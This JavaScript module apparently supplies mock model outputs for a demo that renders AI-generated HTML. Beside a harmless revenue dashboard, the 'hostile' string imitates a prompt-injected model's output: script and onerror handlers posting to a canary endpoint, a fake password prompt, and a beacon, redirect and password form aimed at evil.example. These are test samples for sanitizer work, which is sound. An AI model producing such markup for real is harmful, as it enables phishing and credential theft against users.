// Canned model outputs, streamed in small chunks, so the demo runs without an
// API key. `hostile` is what a prompt-injected model might write.

const dashboard = `<h2>Q3 revenue snapshot</h2>
<p>Revenue grew for the third straight quarter, led by the EU region.</p>
<ui-grid cols="3">
<ui-stat label="Revenue" value="$1.42M" delta="+12.4%"></ui-stat>
<ui-stat label="New customers" value="318" delta="+8.1%"></ui-stat>
<ui-stat label="Avg. order" value="$212" delta="-1.9%"></ui-stat>
</ui-grid>
<ui-card title="Revenue by month ($k)">
<ui-bars series='[{"label":"Apr","value":310},{"label":"May","value":342},{"label":"Jun","value":365},{"label":"Jul","value":410},{"label":"Aug","value":468},{"label":"Sep","value":542}]'></ui-bars>
</ui-card>
<ui-callout tone="good"><strong>On track.</strong> September alone beat the whole of Q1.</ui-callout>
<free-form height="170">
<style>
.sky{position:relative;width:100%;height:100%;background:linear-gradient(#0b1026,#1b2a5a);overflow:hidden}
.star{position:absolute;width:3px;height:3px;border-radius:50%;background:#fff;animation:twinkle 2s infinite alternate}
.s1{left:12%;top:22%}.s2{left:38%;top:58%;animation-delay:.5s}.s3{left:66%;top:18%;animation-delay:1s}.s4{left:86%;top:48%;animation-delay:1.5s}
.rocket{position:absolute;bottom:-30px;left:8%;font-size:34px;animation:fly 4s cubic-bezier(.4,0,.2,1) infinite}
.label{position:absolute;right:16px;bottom:12px;color:#cfe0ff;font-weight:600;letter-spacing:.03em}
@keyframes fly{0%{transform:translate(0,0) rotate(45deg)}100%{transform:translate(78vw,-190px) rotate(45deg)}}
@keyframes twinkle{from{opacity:.2}to{opacity:1}}
</style>
<div class="sky">
<div class="star s1"></div><div class="star s2"></div><div class="star s3"></div><div class="star s4"></div>
<div class="rocket">&#128640;</div>
<div class="label">Three quarters of growth</div>
</div>
</free-form>`

const hostile = `<h2>Your summary</h2>
<p>Here is the report you asked for.</p>
<script>fetch('/canary', {method: 'POST'})</script>
<div data-init="@post('/canary')">Loading account details…</div>
<img src="x" onerror="fetch('/canary', {method: 'POST'})">
<a href="javascript:alert(1)">Click to continue</a>
<ui-stat label="Balance" value="$0.00" data-on:click="@post('/canary')" onclick="steal()"></ui-stat>
<p style="position:fixed;top:0;left:0;right:0;z-index:9999;padding:12px;background:#b00020;color:#fff">Session expired. Re-enter your password below.</p>
<free-form height="130">
<style>
body{background:url(https://evil.example/leak.png)}
.ok{padding:14px 20px;border-radius:10px;background:#2b6cb0;color:#fff;animation:pulse 1.2s infinite alternate}
@keyframes pulse{from{transform:scale(1)}to{transform:scale(1.08)}}
</style>
<script>parent.location = 'https://evil.example'</script>
<form action="https://evil.example"><input name="password"></form>
<div class="ok">This part is harmless, so it still animates.</div>
</free-form>`

export function pickMock(prompt) {
  return /inject|attack|hostile|hack/i.test(prompt) ? hostile : dashboard
}

/** Yields the text a few characters at a time, like a token stream. */
export async function* mockStream(text, signal) {
  for (let i = 0; i < text.length; i += 12) {
    if (signal.aborted) return
    yield text.slice(i, i + 12)
    await new Promise((r) => setTimeout(r, 18))
  }
}
